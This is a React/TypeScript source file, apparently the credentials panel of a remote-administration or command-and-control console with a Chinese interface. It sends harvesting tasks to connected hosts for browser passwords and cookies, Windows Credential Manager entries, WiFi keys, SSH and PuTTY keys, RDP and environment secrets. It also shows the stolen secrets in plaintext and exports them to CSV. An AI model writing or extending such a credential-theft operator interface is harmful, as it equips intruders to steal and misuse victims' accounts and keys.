import { useCallback, useEffect, useMemo, useState } from 'react'
import {
  CopyOutlined,
  DeleteOutlined,
  DownloadOutlined,
  EyeInvisibleOutlined,
  EyeOutlined,
  KeyOutlined,
  ReloadOutlined,
  SafetyOutlined,
  ScanOutlined,
} from '@ant-design/icons'
import {
  App,
  Button,
  ConfigProvider,
  Descriptions,
  Empty,
  Input,
  Modal,
  Popconfirm,
  Select,
  Table,
  Tag,
  Tooltip,
  type TableProps,
} from 'antd'
import { api, downloadGet } from '../api'
import styles from './console.module.css'

type CredItem = {
  id: string
  kind: string
  source: string
  target: string
  user: string
  secret: string
  has_secret: boolean
  note: string
  path: string
  at: number
}

type CredStats = {
  total?: number
  browser?: number
  system?: number
  wifi?: number
  credman?: number
  file?: number
  key?: number
  env?: number
}

type CredData = {
  at: number
  stats: CredStats
  kinds: string[]
  sources: string[]
  items: CredItem[]
}

const EMPTY: CredData = { at: 0, stats: {}, kinds: [], sources: [], items: [] }

const KIND_LABEL: Record<string, string> = {
  C: '浏览器账号',
  S: 'Cookie',
  A: '自动填充',
  N: '说明',
  W: 'WiFi',
  M: '凭据管理器',
  F: 'FTP/客户端',
  G: 'Git',
  K: 'SSH 私钥',
  P: 'PuTTY',
  E: '环境变量',
  R: '远程桌面',
  X: '其他配置',
}

const KIND_COLOR: Record<string, string> = {
  C: 'blue',
  S: 'orange',
  A: 'cyan',
  N: 'default',
  W: 'green',
  M: 'magenta',
  F: 'geekblue',
  G: 'volcano',
  K: 'gold',
  P: 'purple',
  E: 'lime',
  R: 'red',
  X: 'default',
}

function kindLabel(kind: string, source = '') {
  // 真实现场：SSH 私钥以 K + source=SSHKey 上报；旧契约用 S + SSHKey。
  if (/ssh/i.test(source)) return 'SSH 私钥'
  return KIND_LABEL[kind] || kind || '未知'
}

function kindColor(kind: string, source = '') {
  if (/ssh/i.test(source)) return 'geekblue'
  return KIND_COLOR[kind] || 'default'
}

function fmtTime(n?: number) {
  if (!n) return '—'
  return new Date(n * 1000).toLocaleString('zh-CN', { hour12: false })
}

function fmtNum(n?: number) {
  return (Number(n) || 0).toLocaleString('zh-CN')
}

function pathLike(v: string) {
  return /^[A-Za-z][A-Za-z0-9+.-]*:\/\//.test(v) || /^[A-Za-z]:[\\/]/.test(v) || v.startsWith('/') || v.includes('\\')
}

function errText(e: unknown, fallback: string) {
  return e instanceof Error && e.message ? e.message : fallback
}

async function copyText(text: string) {
  try {
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text)
      return true
    }
  } catch {
    /* 剪贴板 API 不可用时走 execCommand */
  }
  const ta = document.createElement('textarea')
  ta.value = text
  ta.setAttribute('readonly', '')
  ta.style.position = 'fixed'
  ta.style.top = '-1000px'
  ta.style.opacity = '0'
  document.body.appendChild(ta)
  ta.select()
  let ok = false
  try {
    ok = document.execCommand('copy')
  } catch {
    ok = false
  } finally {
    ta.remove()
  }
  return ok
}

async function waitTask(sid: string, tid: string) {
  for (let i = 0; i < 240; i++) {
    const st = (await api(`/api/sessions/${encodeURIComponent(sid)}/tasks/${encodeURIComponent(tid)}`)) as {
      done: boolean
      error?: string
    }
    if (st.error) throw new Error(st.error)
    if (st.done) return
    await new Promise((r) => setTimeout(r, 300))
  }
  throw new Error('采集超时')
}

type ScanMode = 'deep' | 'system' | 'all'
type Busy = '' | ScanMode | 'refresh' | 'export' | 'delete'

export default function CredsPanel({ sid, host, online }: { sid: string; host: string; online: boolean }) {
  const { message } = App.useApp()
  const [data, setData] = useState<CredData>(EMPTY)
  const [loading, setLoading] = useState(false)
  const [busy, setBusy] = useState<Busy>('')
  const [q, setQ] = useState('')
  const [source, setSource] = useState<string | undefined>(undefined)
  const [kind, setKind] = useState<string | undefined>(undefined)
  const [secrets, setSecrets] = useState<Map<string, string>>(() => new Map())
  const [revealed, setRevealed] = useState<Set<string>>(() => new Set())
  const [view, setView] = useState<CredItem | null>(null)

  const credUrl = `/api/creds/${encodeURIComponent(host)}`

  const load = useCallback(async () => {
    if (!host) return false
    setLoading(true)
    try {
      const d = (await api(`/api/creds/${encodeURIComponent(host)}`)) as Partial<CredData> | null
      const items = (Array.isArray(d?.items) ? d.items : []).map((it) => ({
        ...it,
        has_secret: typeof it.has_secret === 'boolean' ? it.has_secret : !!it.secret,
      }))
      setData({
        at: Number(d?.at) || 0,
        stats: d?.stats && typeof d.stats === 'object' ? d.stats : {},
        kinds: Array.isArray(d?.kinds) ? d.kinds : [],
        sources: Array.isArray(d?.sources) ? d.sources : [],
        items,
      })
      setSecrets(new Map())
      setRevealed(new Set())
      return true
    } catch (e) {
      message.error(errText(e, '读取凭据失败'))
      return false
    } finally {
      setLoading(false)
    }
  }, [host, message])

  useEffect(() => {
    void load()
  }, [load])

  const fetchSecrets = useCallback(
    async (ids: string[]) => {
      const got = new Map<string, string>()
      if (!host || !ids.length) return got
      for (let off = 0; off < ids.length; off += 2000) {
        const r = (await api(`${credUrl}/reveal`, {
          method: 'POST',
          body: JSON.stringify({ ids: ids.slice(off, off + 2000) }),
        })) as { secrets?: Record<string, string> } | null
        if (r?.secrets && typeof r.secrets === 'object') {
          for (const [k, v] of Object.entries(r.secrets)) {
            got.set(k, typeof v === 'string' ? v : String(v ?? ''))
          }
        }
      }
      if (got.size) {
        setSecrets((prev) => {
          const next = new Map(prev)
          got.forEach((v, k) => next.set(k, v))
          return next
        })
      }
      return got
    },
    [host, credUrl],
  )

  const hideOne = (id: string) => {
    setRevealed((prev) => {
      const next = new Set(prev)
      next.delete(id)
      return next
    })
  }

  const showOne = (id: string) => {
    setRevealed((prev) => {
      const next = new Set(prev)
      next.add(id)
      return next
    })
  }

  const toggleOne = useCallback(
    async (r: CredItem) => {
      if (!r.has_secret) return
      if (revealed.has(r.id)) {
        hideOne(r.id)
        return
      }
      try {
        if (!secrets.has(r.id)) {
          const got = await fetchSecrets([r.id])
          if (!got.has(r.id)) {
            message.info('服务端未返回该条明文')
            return
          }
        }
        showOne(r.id)
      } catch (e) {
        message.error(errText(e, '读取明文失败'))
      }
    },
    [revealed, secrets, fetchSecrets, message],
  )

  const copyRow = async (r: CredItem) => {
    if (!r.has_secret) {
      message.info('该条没有密钥')
      return
    }
    let text = secrets.get(r.id)
    if (text === undefined) {
      try {
        const got = await fetchSecrets([r.id])
        text = got.get(r.id)
      } catch (e) {
        message.error(errText(e, '读取明文失败'))
        return
      }
    }
    if (text === undefined) {
      message.info('服务端未返回该条明文')
      return
    }
    const ok = await copyText(text)
    if (ok) message.success('已复制')
    else message.error('复制失败，请手动选择文本')
  }

  const trigger = async (mode: ScanMode) => {
    if (!sid || !host || !online) return
    setBusy(mode)
    try {
      let tid = ''
      if (mode === 'deep') {
        const r = (await api(`/api/sessions/${encodeURIComponent(sid)}/browser/deep`, {
          method: 'POST',
          body: '{}',
        })) as { task_id?: string } | null
        tid = r?.task_id || ''
      } else {
        const r = (await api(`/api/sessions/${encodeURIComponent(sid)}/creds`, {
          method: 'POST',
          body: JSON.stringify({ scope: mode === 'all' ? 'all' : 'system' }),
        })) as { task_id?: string } | null
        tid = r?.task_id || ''
      }
      if (!tid) throw new Error('服务端未返回任务编号')
      await waitTask(sid, tid)
      // hub 在任务 done 后用 goroutine 落盘，留出写入窗口再读。
      await new Promise((r) => setTimeout(r, 400))
      if (await load()) {
        message.success(
          mode === 'deep' ? '深度收集完成，结果已刷新' : mode === 'all' ? '全部凭据采集完成' : '系统凭据采集完成',
        )
      }
    } catch (e) {
      message.error(errText(e, mode === 'deep' ? '深度收集失败' : '凭据采集失败'))
    } finally {
      setBusy('')
    }
  }

  const refresh = async () => {
    setBusy('refresh')
    try {
      if (await load()) message.success('已刷新')
    } finally {
      setBusy('')
    }
  }

  const exportCsv = async () => {
    if (!host) return
    setBusy('export')
    try {
      const { name } = await downloadGet(`${credUrl}/export`, `creds-${host}.csv`)
      message.success(`已导出 ${name}`)
    } catch (e) {
      message.error(errText(e, '导出失败'))
    } finally {
      setBusy('')
    }
  }

  const remove = async () => {
    if (!host) return
    setBusy('delete')
    try {
      await api(credUrl, { method: 'DELETE' })
      if (await load()) message.success('已删除该主机的凭据记录')
    } catch (e) {
      message.error(errText(e, '删除失败'))
    } finally {
      setBusy('')
    }
  }

  const sourceOptions = useMemo(() => {
    const seen = new Set<string>()
    const out: { value: string; label: string }[] = []
    for (const s of data.sources) {
      if (!s || seen.has(s)) continue
      seen.add(s)
      out.push({ value: s, label: s })
    }
    return out.sort((a, b) => a.label.localeCompare(b.label))
  }, [data.sources])

  const kindOptions = useMemo(() => {
    const seen = new Set<string>()
    const out: { value: string; label: string }[] = []
    const all = data.kinds.length ? data.kinds : data.items.map((i) => i.kind)
    for (const k of all) {
      if (!k || seen.has(k)) continue
      seen.add(k)
      out.push({ value: k, label: kindLabel(k) })
    }
    return out
  }, [data.kinds, data.items])

  const filtered = useMemo(() => {
    const needle = q.trim().toLowerCase()
    return data.items.filter((it) => {
      if (source && it.source !== source) return false
      if (kind && it.kind !== kind) return false
      if (!needle) return true
      return [it.source, it.target, it.user, it.note].join(' ').toLowerCase().includes(needle)
    })
  }, [data.items, source, kind, q])

  const revealIds = filtered.filter((it) => it.has_secret).map((it) => it.id)
  const allRevealed = revealIds.length > 0 && revealIds.every((id) => revealed.has(id))

  const toggleAll = async () => {
    if (!revealIds.length) {
      message.info('当前筛选没有可显示的密钥')
      return
    }
    if (allRevealed) {
      setRevealed((prev) => {
        const next = new Set(prev)
        revealIds.forEach((id) => next.delete(id))
        return next
      })
      return
    }
    const missing = revealIds.filter((id) => !secrets.has(id))
    if (missing.length) {
      try {
        await fetchSecrets(missing)
      } catch (e) {
        message.error(errText(e, '读取明文失败'))
        return
      }
    }
    setRevealed((prev) => {
      const next = new Set(prev)
      revealIds.forEach((id) => next.add(id))
      return next
    })
  }

  const renderSecret = (r: CredItem) => {
    const shown = revealed.has(r.id)
    const text = shown ? secrets.get(r.id) ?? r.secret : r.secret
    return (
      <span className={styles.credSecret}>
        <span className={`${styles.mono} ${styles.credSecretText}`} title={shown ? text : undefined}>
          {text || (r.has_secret ? '（空）' : '—')}
        </span>
        {r.has_secret ? (
          <Tooltip title={shown ? '隐藏明文' : '显示明文'}>
            <Button
              type="text"
              size="small"
              aria-label={shown ? '隐藏该条密钥' : '显示该条密钥'}
              aria-pressed={shown}
              icon={shown ? <EyeInvisibleOutlined /> : <EyeOutlined />}
              onClick={() => void toggleOne(r)}
            />
          </Tooltip>
        ) : null}
      </span>
    )
  }

  const columns: NonNullable<TableProps<CredItem>['columns']> = [
    {
      title: '类型',
      dataIndex: 'kind',
      width: 124,
      render: (k: string, r: CredItem) => <Tag color={kindColor(k, r.source)}>{kindLabel(k, r.source)}</Tag>,
    },
    { title: '来源', dataIndex: 'source', width: 140, ellipsis: true, render: (v: string) => v || '—' },
    {
      title: '目标',
      dataIndex: 'target',
      ellipsis: true,
      render: (v: string, r: CredItem) => {
        const text = v || r.path
        return (
          <span className={pathLike(text) ? styles.mono : undefined} title={text}>
            {text || '—'}
          </span>
        )
      },
    },
    { title: '用户', dataIndex: 'user', width: 150, ellipsis: true, render: (v: string) => v || '—' },
    { title: '密钥', dataIndex: 'secret', width: 200, render: (_: unknown, r: CredItem) => renderSecret(r) },
    { title: '备注', dataIndex: 'note', ellipsis: true, render: (v: string) => v || '—' },
    { title: '采集时间', dataIndex: 'at', width: 170, render: (v: number) => fmtTime(v) },
    {
      title: '操作',
      width: 160,
      render: (_: unknown, r: CredItem) => (
        <span>
          <Button type="link" size="small" icon={<CopyOutlined />} disabled={!r.has_secret} onClick={() => void copyRow(r)}>
            复制
          </Button>
          <Button type="link" size="small" onClick={() => setView(r)}>
            查看
          </Button>
        </span>
      ),
    },
  ]

  const stats = data.stats
  const cards = [
    { label: '总数', value: stats.total ?? data.items.length },
    { label: '浏览器', value: stats.browser ?? 0 },
    { label: '系统', value: stats.system ?? 0 },
    { label: 'WiFi', value: stats.wifi ?? 0 },
    { label: '凭据管理器', value: stats.credman ?? 0 },
    { label: '密钥', value: stats.key ?? 0 },
  ]

  if (!host) {
    return (
      <div className={styles.credPane}>
        <div className={styles.hint}>正在读取主机信息，凭据记录会在主机名就绪后自动加载</div>
      </div>
    )
  }

  const scanDisabled = !online || busy !== ''

  return (
    <div className={styles.credPane}>
      <div className={styles.credHead}>
        <Button
          size="small"
          icon={<KeyOutlined />}
          loading={busy === 'deep'}
          disabled={scanDisabled}
          onClick={() => void trigger('deep')}
        >
          深度收集
        </Button>
        <Button
          size="small"
          icon={<SafetyOutlined />}
          loading={busy === 'system'}
          disabled={scanDisabled}
          onClick={() => void trigger('system')}
        >
          系统凭据
        </Button>
        <Button
          size="small"
          icon={<ScanOutlined />}
          loading={busy === 'all'}
          disabled={scanDisabled}
          onClick={() => void trigger('all')}
        >
          全部收集
        </Button>
        <Button
          size="small"
          icon={<ReloadOutlined />}
          loading={busy === 'refresh'}
          disabled={busy !== ''}
          onClick={() => void refresh()}
        >
          刷新
        </Button>
        <Button
          size="small"
          icon={<DownloadOutlined />}
          loading={busy === 'export'}
          disabled={!data.items.length || busy !== ''}
          onClick={() => void exportCsv()}
        >
          导出 CSV
        </Button>
        <Popconfirm
          title="删除该主机的全部凭据记录？"
          description="记录会从控制台移除，需要重新采集。"
          okText="删除"
          cancelText="取消"
          okButtonProps={{ danger: true }}
          onConfirm={() => void remove()}
        >
          <Button
            size="small"
            danger
            icon={<DeleteOutlined />}
            loading={busy === 'delete'}
            disabled={!data.items.length || busy !== ''}
          >
            删除
          </Button>
        </Popconfirm>
      </div>
      <div className={styles.credMeta}>
        <span className={styles.mono}>{host}</span>
        <span>{data.at ? `采集于 ${fmtTime(data.at)}` : '尚未采集'}</span>
        <span>共 {fmtNum(stats.total ?? data.items.length)} 条</span>
        {!online ? <span className={styles.credWarn}>主机离线，采集按钮不可用，可查看与导出已存记录</span> : null}
      </div>
      <div className={styles.credStats} role="group" aria-label="凭据统计">
        {cards.map((c) => (
          <div key={c.label} className={styles.credStat}>
            <span className={styles.credStatNum}>{fmtNum(c.value)}</span>
            <span className={styles.credStatLabel}>{c.label}</span>
          </div>
        ))}
      </div>
      <div className={styles.credFilters}>
        <Input
          allowClear
          size="small"
          aria-label="搜索凭据"
          placeholder="搜索来源 / 目标 / 用户 / 备注"
          value={q}
          onChange={(e) => setQ(e.target.value)}
          style={{ maxWidth: 260 }}
        />
        <Select
          allowClear
          size="small"
          aria-label="按来源筛选"
          placeholder="来源"
          style={{ width: 160 }}
          value={source}
          onChange={(v) => setSource(v)}
          options={sourceOptions}
        />
        <Select
          allowClear
          size="small"
          aria-label="按类型筛选"
          placeholder="类型"
          style={{ width: 180 }}
          value={kind}
          onChange={(v) => setKind(v)}
          options={kindOptions}
        />
        <Button
          type="link"
          size="small"
          disabled={!revealIds.length}
          aria-pressed={allRevealed}
          onClick={() => void toggleAll()}
        >
          {allRevealed ? '全部隐藏' : '全部显示'}
        </Button>
        <span className={styles.credCount}>
          {filtered.length} / {data.items.length} 条
        </span>
      </div>
      <ConfigProvider theme={{ components: { Table: { cellFontSize: 12, cellFontSizeMD: 12, cellFontSizeSM: 12 } } }}>
        <Table<CredItem>
          size="small"
          rowKey="id"
          loading={loading}
          dataSource={filtered}
          pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
          scroll={{ x: 1180 }}
          locale={{
            emptyText: (
              <Empty
                image={Empty.PRESENTED_IMAGE_SIMPLE}
                description={online ? '该主机尚未采集凭据' : '主机离线，暂无凭据记录'}
              />
            ),
          }}
          columns={columns}
        />
      </ConfigProvider>
      <Modal title="凭据详情" open={!!view} footer={null} onCancel={() => setView(null)} width={720}>
        {view ? (
          <Descriptions
            size="small"
            column={1}
            bordered
            items={[
              {
                key: 'kind',
                label: '类型',
                children: <Tag color={kindColor(view.kind, view.source)}>{kindLabel(view.kind, view.source)}</Tag>,
              },
              { key: 'source', label: '来源', children: view.source || '—' },
              { key: 'target', label: '目标', children: <span className={styles.mono}>{view.target || '—'}</span> },
              { key: 'user', label: '用户', children: view.user || '—' },
              {
                key: 'secret',
                label: '密钥',
                children: (
                  <span className={styles.mono}>
                    {revealed.has(view.id) ? (secrets.get(view.id) ?? view.secret) || '（空）' : view.secret || '—'}
                  </span>
                ),
              },
              { key: 'note', label: '备注', children: view.note || '—' },
              { key: 'path', label: '路径', children: <span className={styles.mono}>{view.path || '—'}</span> },
              { key: 'at', label: '采集时间', children: fmtTime(view.at) },
            ]}
          />
        ) : null}
      </Modal>
    </div>
  )
}
